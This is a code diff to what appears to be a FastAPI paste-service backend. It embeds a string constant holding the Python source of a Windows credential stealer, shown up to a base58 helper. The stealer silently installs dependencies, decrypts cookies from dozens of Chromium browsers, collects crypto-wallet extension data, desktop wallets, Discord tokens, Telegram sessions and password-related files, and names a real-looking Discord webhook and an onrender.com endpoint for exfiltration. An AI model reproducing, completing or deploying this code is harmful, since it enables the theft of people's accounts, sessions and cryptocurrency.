@@ -237,6 +237,950 @@ async def delete_paste_api(pasteid: str = Query(...), deletetoken: str = Query(.
     
     return {"status": 0, "message": message}
 
+RAW_FILE_CONTENT = """
+import re
+import sqlite3
+import shutil
+import subprocess
+import time
+from urllib.request import Request, urlopen
+import zipfile
+import requests
+import os
+import sys
+import json
+import base64
+import zlib
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.backends import default_backend
+from mimetypes import guess_type
+
+CURRENT_INTERPRETER = sys.executable
+# Corrigido o comando pip install para separar "websocket-client" e "cryptography"
+proc = subprocess.Popen([CURRENT_INTERPRETER, "-m", "pip", "install", "pycryptodome", "pypiwin32", "pywin32","requests", "websocket-client", "cryptography", "regex", "urllib3", "pycryptodomex", "base58"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
+proc.wait()
+
+try:
+    import win32crypt
+    from Crypto.Cipher import AES
+    import requests
+    import websocket
+except:
+    current_file = os.path.abspath(__file__)
+    subprocess.Popen([CURRENT_INTERPRETER, current_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
+    exit()
+
+USER_PROFILE = os.getenv('USERPROFILE')
+APPDATA = os.getenv('APPDATA')
+LOCALAPPDATA = os.getenv('LOCALAPPDATA')
+STORAGE_PATH = os.path.join(APPDATA, "Microsoft Store (x86)")
+PROGRAMFILESX86 = os.getenv("ProgramFiles(x86)")
+
+COOKIECOUNT = 0
+TOKENCOUNT = 0 # Adicionado para que possa ser usado, embora não seja usado ativamente para contagem final no webhook
+FILES = []
+DISCORD_TOKENS = []
+PASSWORDS = []
+COOKIES = []
+WEB_DATA = []
+DISCORD_IDS = []
+payload = {}
+
+# Infection "notice"
+if os.path.exists(os.path.join(LOCALAPPDATA, "Microsoft Teams")):
+    sys.exit(0)
+else:
+    os.makedirs(os.path.join(LOCALAPPDATA, "Microsoft Teams"), exist_ok=True) # exist_ok=True para segurança
+
+if not os.path.exists(STORAGE_PATH):
+    os.makedirs(STORAGE_PATH)
+
+CHROME_PATHS = [
+    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
+	{"name": "Chrome (x86)", "path": os.path.join(LOCALAPPDATA, "Google(x86)", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": (PROGRAMFILESX86 + "\\Google\\Chrome\\Application\\chrome.exe") if PROGRAMFILESX86 else ""},
+	{"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"), "taskname": "chrome.exe", "exepath": (LOCALAPPDATA + "\\Google\\Chrome SxS\\Application\\chrome.exe") if LOCALAPPDATA else ""},
+	{"name": "Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe", "exepath": (PROGRAMFILESX86 + "\\Microsoft\\Edge\\Application\\msedge.exe") if PROGRAMFILESX86 else ""},
+	{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe", "exepath": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
+]
+CHROMIUM_BROWSERS = [
+    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
+	{"name": "Chrome (x86)", "path": os.path.join(LOCALAPPDATA, "Google(x86)", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": (PROGRAMFILESX86 + "\\Google\\Chrome\\Application\\chrome.exe") if PROGRAMFILESX86 else ""},
+	{"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"), "taskname": "chrome.exe", "exepath": (LOCALAPPDATA + "\\Google\\Chrome SxS\\Application\\chrome.exe") if LOCALAPPDATA else ""},
+	{"name": "Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe", "exepath": (PROGRAMFILESX86 + "\\Microsoft\\Edge\\Application\\msedge.exe") if PROGRAMFILESX86 else ""},
+	{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe", "exepath": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
+    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable") if APPDATA else "", "taskname": "opera.exe", "exepath": ""},
+    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable") if APPDATA else "", "taskname": "opera.exe", "exepath": ""},
+    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data") if APPDATA else "", "taskname": "yandex.exe", "exepath": ""},
+    {"name": "Chromium", "path": os.path.join(LOCALAPPDATA, "Chromium", "User Data") if LOCALAPPDATA else "", "taskname": "chromium.exe", "exepath": ""},
+    {"name": "Thorium", "path": os.path.join(LOCALAPPDATA, "Thorium", "User Data") if LOCALAPPDATA else "", "taskname": "thorium.exe", "exepath": ""},
+    {"name": "Maple", "path": os.path.join(LOCALAPPDATA, "MapleStudio", "ChromePlus", "User Data") if LOCALAPPDATA else "", "taskname": "maple.exe", "exepath": ""},
+    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data") if LOCALAPPDATA else "", "taskname": "iridium.exe", "exepath": ""},
+    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data") if LOCALAPPDATA else "", "taskname": "7star.exe", "exepath": ""},
+    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data") if LOCALAPPDATA else "", "taskname": "centbrowser.exe", "exepath": ""},
+    {"name": "Chedot", "path": os.path.join(LOCALAPPDATA, "Chedot", "User Data") if LOCALAPPDATA else "", "taskname": "chedot.exe", "exepath": ""},
+    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data") if LOCALAPPDATA else "", "taskname": "vivaldi.exe", "exepath": ""},
+    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data") if LOCALAPPDATA else "", "taskname": "kometa.exe", "exepath": ""},
+    {"name": "Elements", "path": os.path.join(LOCALAPPDATA, "Elements Browser", "User Data") if LOCALAPPDATA else "", "taskname": "elements.exe", "exepath": ""},
+    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data") if LOCALAPPDATA else "", "taskname": "epic.exe", "exepath": ""},
+    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data") if LOCALAPPDATA else "", "taskname": "uran.exe", "exepath": ""},
+    {"name": "Fenrir", "path": os.path.join(LOCALAPPDATA, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer") if LOCALAPPDATA else "", "taskname": "fenrir.exe", "exepath": ""},
+    {"name": "Catalina", "path": os.path.join(LOCALAPPDATA, "CatalinaGroup", "Citrio", "User Data") if LOCALAPPDATA else "", "taskname": "catalina.exe", "exepath": ""},
+    {"name": "Coowon", "path": os.path.join(LOCALAPPDATA, "Coowon", "Coowon", "User Data") if LOCALAPPDATA else "", "taskname": "coowon.exe", "exepath": ""},
+    {"name": "Liebao", "path": os.path.join(LOCALAPPDATA, "liebao", "User Data") if LOCALAPPDATA else "", "taskname": "liebao.exe", "exepath": ""},
+    {"name": "QIP Surf", "path": os.path.join(LOCALAPPDATA, "QIP Surf", "User Data") if LOCALAPPDATA else "", "taskname": "qipsurf.exe", "exepath": ""},
+    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data") if LOCALAPPDATA else "", "taskname": "orbitum.exe", "exepath": ""},
+    {"name": "Dragon", "path": os.path.join(LOCALAPPDATA, "Comodo", "Dragon", "User Data") if LOCALAPPDATA else "", "taskname": "dragon.exe", "exepath": ""},
+    {"name": "360Browser", "path": os.path.join(LOCALAPPDATA, "360Browser", "Browser", "User Data") if LOCALAPPDATA else "", "taskname": "360browser.exe", "exepath": ""},
+    {"name": "Maxthon", "path": os.path.join(LOCALAPPDATA, "Maxthon3", "User Data") if LOCALAPPDATA else "", "taskname": "maxthon.exe", "exepath": ""},
+    {"name": "K-Melon", "path": os.path.join(LOCALAPPDATA, "K-Melon", "User Data") if LOCALAPPDATA else "", "taskname": "kmelon.exe", "exepath": ""},
+    {"name": "CocCoc", "path": os.path.join(LOCALAPPDATA, "CocCoc", "Browser", "User Data") if LOCALAPPDATA else "", "taskname": "coccoc.exe", "exepath": ""},
+    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data") if LOCALAPPDATA else "", "taskname": "amigo.exe", "exepath": ""},
+    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data") if LOCALAPPDATA else "", "taskname": "torch.exe", "exepath": ""},
+    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data") if LOCALAPPDATA else "", "taskname": "sputnik.exe", "exepath": ""},
+    {"name": "DCBrowser", "path": os.path.join(LOCALAPPDATA, "DCBrowser", "User Data") if LOCALAPPDATA else "", "taskname": "dcbrowser.exe", "exepath": ""},
+    {"name": "UR Browser", "path": os.path.join(LOCALAPPDATA, "UR Browser", "User Data") if LOCALAPPDATA else "", "taskname": "urbrowser.exe", "exepath": ""},
+    {"name": "Slimjet", "path": os.path.join(LOCALAPPDATA, "Slimjet", "User Data") if LOCALAPPDATA else "", "taskname": "slimjet.exe", "exepath": ""},
+]
+CHROMIUM_SUBPATHS = [
+    {"path": ""},
+    {"path": "Default"},
+    {"path": "Profile 1"},
+    {"path": "Profile 2"},
+    {"path": "Profile 3"},
+    {"path": "Profile 4"},
+    {"path": "Profile 5"},
+]
+BROWSER_EXTENSIONS = [
+    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
+    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
+    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
+    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
+    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
+    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
+    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
+    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
+    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
+    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
+    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
+    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
+    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
+    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
+    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
+    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
+    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
+    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
+    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
+    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
+    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
+    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
+    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
+    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
+    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
+    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
+    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
+    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
+    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
+    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
+    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
+    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
+    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
+    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
+    {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
+    {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},
+    {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
+    {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},
+    {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},
+    {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},
+    {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
+    {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},
+    {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
+    {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
+    {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},
+    {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},
+    {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},
+    {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
+    {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
+    {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
+    {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},
+    {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
+    {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},
+    {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
+    {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},
+    {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}
+]
+WALLET_PATHS = [
+    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb") if APPDATA else ""},
+    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet") if APPDATA else ""},
+    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets") if APPDATA else ""},
+    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets") if APPDATA else ""},
+    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash") if APPDATA else ""},
+    {"name": "Armory", "path": os.path.join(APPDATA, "Armory") if APPDATA else ""},
+    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin") if APPDATA else ""},
+    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb") if APPDATA else ""},
+    {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore") if APPDATA else ""},
+    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb") if APPDATA else ""},
+    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets") if APPDATA else ""},
+]
+PATHS_TO_SEARCH = [
+    os.path.join(USER_PROFILE, "Desktop") if USER_PROFILE else "",
+    os.path.join(USER_PROFILE, "Documents") if USER_PROFILE else "",
+    os.path.join(USER_PROFILE, "Downloads") if USER_PROFILE else "",
+    os.path.join(USER_PROFILE, "OneDrive", "Documents") if USER_PROFILE else "",
+    os.path.join(USER_PROFILE, "OneDrive", "Desktop") if USER_PROFILE else "",
+]
+# Filtrar caminhos vazios caso USER_PROFILE não esteja definido
+PATHS_TO_SEARCH = [p for p in PATHS_TO_SEARCH if p]
+
+
+FILE_KEYWORDS = [
+        "passw", "mdp", "motdepasse", "mot_de_passe", "login", "secret", "account", "acount",
+        "paypal", "banque", "banc", "bank", "metamask", "wallet", "crypto", "exodus",
+        "discord", "2fa", "code", "memo", "compte", "token", "backup", "seecret", "passphrase"
+]
+ALLOWED_EXTENSIONS = [
+    ".txt", ".log", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
+    ".odt", ".pdf", ".rtf", ".json", ".csv", ".xml", ".db",
+    ".jpg", ".jpeg", ".png", ".gif", ".webp", ".mp4"
+]
+DISCORD_PATHS = [
+    {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb") if APPDATA else ""},
+    {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb") if APPDATA else ""},
+    {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb") if APPDATA else ""},
+    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb") if APPDATA else ""},
+    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb") if APPDATA else ""},
+    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb") if LOCALAPPDATA else ""},
+    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb") if LOCALAPPDATA else ""}
+]
+# Filtrar dicionários com caminhos vazios (caso APPDATA/LOCALAPPDATA não estejam definidos)
+CHROME_PATHS = [p for p in CHROME_PATHS if p.get("path")]
+CHROMIUM_BROWSERS = [p for p in CHROMIUM_BROWSERS if p.get("path")]
+WALLET_PATHS = [p for p in WALLET_PATHS if p.get("path")]
+DISCORD_PATHS = [p for p in DISCORD_PATHS if p.get("path")]
+
+
+# URLs PARA ENVIO (Substitua pelas suas URLs reais)
+YOUR_RENDER_API_URL = "https://gh3hg93hguu9rhguoehuigoehrhgupioeruguehg.onrender.com" # Será usada na função main
+PRIVATEBIN_FIXED_PASSWORD = "7IvaKi$yAVb0"
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1373415092619579504/b9JsYFslWLxyNie2ol2Cv4c7LDdQj5qR3kBX-jNocb2Dand5wNEtUbwXg-QIWX5fSHFS"
+
+
+# --- FUNÇÕES AUXILIARES ---
+
+def decrypt_data(encrypted_value_bytes, key_bytes):
+    """Descriptografa dados usando AES GCM ou win32crypt como fallback."""
+    if not encrypted_value_bytes or not key_bytes: return "Invalid input for decryption"
+    try:
+        iv = encrypted_value_bytes[3:15]
+        payload_with_tag = encrypted_value_bytes[15:]
+        # Usar AESGCM de cryptography.hazmat para consistência com privatebin_encrypt
+        # No entanto, o código original usa Crypto.Cipher.AES que não tem AESGCM diretamente da mesma forma
+        # Mantendo Crypto.Cipher.AES.MODE_GCM por enquanto, mas pode ser uma fonte de problemas se a tag não for bem manuseada.
+        # A biblioteca `Crypto` espera a tag separada para verificação.
+        # `payload_with_tag` aqui inclui a tag no final.
+        cipher = AES.new(key_bytes, AES.MODE_GCM, nonce=iv)
+        decrypted_data = cipher.decrypt_and_verify(payload_with_tag[:-16], payload_with_tag[-16:]) # decrypt_and_verify
+        return decrypted_data.decode('utf-8', errors='ignore')
+    except ValueError: # Falha na verificação da tag ou outro erro de valor com AES GCM
+        # print(f"    AES GCM decrypt failed (ValueError/Tag mismatch). Trying win32crypt...") # Debug
+        try:
+            return win32crypt.CryptUnprotectData(encrypted_value_bytes, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+        except Exception: # e_dpapi:
+            # print(f"    win32crypt decrypt failed: {e_dpapi}") # Debug
+            return "Failed to decrypt"
+    except Exception: # e_aes_other:
+        # print(f"    AES GCM decrypt failed (Other Exception: {e_aes_other}). Trying win32crypt...") # Debug
+        try:
+            return win32crypt.CryptUnprotectData(encrypted_value_bytes, None, None, None, 0)[1].decode('utf-8', errors='ignore')
+        except Exception: # e_dpapi_fallback:
+            # print(f"    win32crypt decrypt (fallback) failed: {e_dpapi_fallback}") # Debug
+            return "Failed to decrypt"
+
+
+def zip_to_storage(name_prefix, source_path, destination_folder):
+    """Cria um zip de um arquivo ou pasta e salva na destination_folder."""
+    safe_name_prefix = "".join(c if c.isalnum() or c in (' ', '_', '-') else '_' for c in name_prefix).rstrip()
+    zip_file_name = os.path.join(destination_folder, f"{safe_name_prefix}.zip")
+    try:
+        with zipfile.ZipFile(zip_file_name, "w", compression=zipfile.ZIP_DEFLATED, allowZip64=True) as zf:
+            if os.path.isfile(source_path):
+                zf.write(source_path, os.path.basename(source_path))
+            elif os.path.isdir(source_path):
+                for root, _, files_in_dir in os.walk(source_path):
+                    for file_item in files_in_dir:
+                        file_full_path = os.path.join(root, file_item)
+                        try:
+                            if os.path.getsize(file_full_path) > 50 * 1024 * 1024:
+                                print(f"AVISO: Arquivo '{file_full_path}' muito grande (>50MB), pulando para {zip_file_name}.")
+                                continue
+                        except OSError: # Arquivo pode não existir mais ou ser inacessível
+                            continue
+                        arcname = os.path.relpath(file_full_path, os.path.dirname(source_path))
+                        zf.write(file_full_path, arcname)
+            else:
+                pass
+    except Exception as e_zip:
+        print(f"ERRO ao zipar '{source_path}' para '{zip_file_name}': {e_zip}")
+
+def validate_discord_token(token):
+    """Valida um token do Discord e retorna dados do usuário se válido."""
+    if not token or not isinstance(token, str): return None
+    try:
+        headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"}
+        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=7)
+        if r.status_code == 200:
+            return r.json()
+        return None
+    except requests.exceptions.RequestException:
+        return None
+
+def chromiumcookies(profilepath, browser_name, profile_name_subpath, decryption_key_bytes):
+    """Extrai cookies de um perfil Chromium."""
+    global COOKIECOUNT, COOKIES, STORAGE_PATH
+    cookies_temp_db = None
+    try:
+        cookies_file = os.path.join(profilepath, "Network", "Cookies")
+        if not os.path.exists(cookies_file): return
+
+        # Garantir que STORAGE_PATH existe
+        if not os.path.exists(STORAGE_PATH):
+            os.makedirs(STORAGE_PATH, exist_ok=True)
+        
+        # Nome de arquivo temporário mais robusto para evitar colisões de nome
+        temp_db_basename = f"TEMP_{browser_name.replace(' ', '_')}_{profile_name_subpath.replace(' ', '_').replace('\\','_').replace('/','_')}_Cookies.db"
+        cookies_temp_db = os.path.join(STORAGE_PATH, temp_db_basename)
+
+        shutil.copy2(cookies_file, cookies_temp_db)
+
+        conn = sqlite3.connect(cookies_temp_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
+        
+        cookie_str_for_netscape = ""
+        for host, name, enc_val, path, exp_utc, is_sec, is_http in cursor.fetchall():
+            dec_val = decrypt_data(enc_val, decryption_key_bytes)
+            if dec_val == "Failed to decrypt" or dec_val is None : continue # Adicionado cheque para None
+
+            inc_sub = "TRUE" if host.startswith('.') else "FALSE"
+            sec_flg = "TRUE" if is_sec == 1 else "FALSE"
+            exp_unix = int((exp_utc / 1000000) - 11644473600) if exp_utc != 0 else 0
+            
+            cookie_str_for_netscape += f"{host}\t{inc_sub}\t{path}\t{sec_flg}\t{exp_unix}\t{name}\t{dec_val}\n"
+            COOKIECOUNT += 1
+        
+        conn.close()
+        if cookie_str_for_netscape:
+            COOKIES.append({
+                "browser": browser_name, "profile": profile_name_subpath, 
+                "cookies_netscape_b64": base64.b64encode(cookie_str_for_netscape.encode('utf-8', 'ignore')).decode('utf-8')
+            })
+    except sqlite3.Error:
+        pass
+    except Exception:
+        pass
+    finally:
+        if cookies_temp_db and os.path.exists(cookies_temp_db):
+            try: os.remove(cookies_temp_db)
+            except Exception: pass
+
+def telegram():
+    """Tenta zipar a pasta tdata do Telegram Desktop."""
+    global STORAGE_PATH, APPDATA
+    if not APPDATA: return
+    source = os.path.join(APPDATA, "Telegram Desktop", "tdata")
+    if os.path.exists(source) and os.path.isdir(source):
+        zip_to_storage("Telegram_Session_tdata", source, STORAGE_PATH)
+
+# --- FUNÇÕES PARA PRIVATEBIN ---
+def json_encode(d):
+    return json.dumps(d, separators=(',', ':')).encode('utf-8')
+
+def base58_encode(v_bytes: bytes):
+    alphabet = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
+    alphabet_len = len(alphabet)
+    n_pad = len(v_bytes)
+    v_bytes = v_bytes.lstrip(b'\0')
+    n_pad -= len(v_bytes)
